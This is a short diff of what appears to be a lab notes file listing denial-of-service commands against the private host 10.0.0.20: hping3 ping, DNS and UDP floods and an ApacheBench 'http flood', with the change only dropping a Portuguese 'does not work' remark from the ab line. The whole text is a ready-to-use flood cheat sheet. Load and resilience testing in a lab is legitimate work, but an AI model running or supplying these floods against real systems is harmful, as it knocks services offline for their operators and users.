@@ -5,7 +5,7 @@ ping flood -> sudo hping3 -1 --flood 10.0.0.20
 
 dns flood -> sudo hping3 -2 -p 53 --flood 10.0.0.20
 
-http flood -> ab -n 100 -c 50 http://10.0.0.20/ # nao funciona
+http flood -> ab -n 100 -c 50 http://10.0.0.20/ 
 
 udp flood -> sudo hping3 --udp -p 80 --flood 10.0.0.20
 
